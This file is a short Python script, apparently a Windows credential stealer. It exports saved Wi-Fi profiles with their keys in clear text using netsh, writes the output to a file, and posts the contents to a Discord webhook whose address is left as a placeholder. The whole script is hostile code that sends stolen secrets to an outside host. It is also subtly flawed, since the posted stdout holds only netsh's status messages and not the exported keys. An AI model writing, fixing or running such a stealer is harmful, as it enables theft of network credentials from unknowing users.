import subprocess
import os
import requests

# Discord webhook URL
discord_webhook_url = 'Sem napisem Discord webhook link'

# Create a file
password_file = open('passwords.txt', "w")
password_file.write("Hello sir! Here are your passwords:\n\n")
password_file.close()

# Lists
wifi_files = []
wifi_names = []
wifi_passwords = []

# Use Python to execute a Windows command
command_output = subprocess.run(["netsh", "wlan", "export", "profile", "key=clear"], capture_output=True).stdout.decode()

# Grab current directory
path = os.getcwd()

# Write command output to the file
with open('passwords.txt', 'a') as password_file:
    password_file.write(command_output)

# Read the content of the file
with open('passwords.txt', 'r') as password_file:
    content = password_file.read()

# Prepare data for Discord webhook
discord_data = {
    'content': f"🚀 **Breaking News!** 🚀\n\n{content}\n\n🔐 *Secured and Sent!* 🔐"
}

# Send data to Discord webhook
response = requests.post(discord_webhook_url, json=discord_data)

print("Data sent to Discord webhook. Feel the drama!")
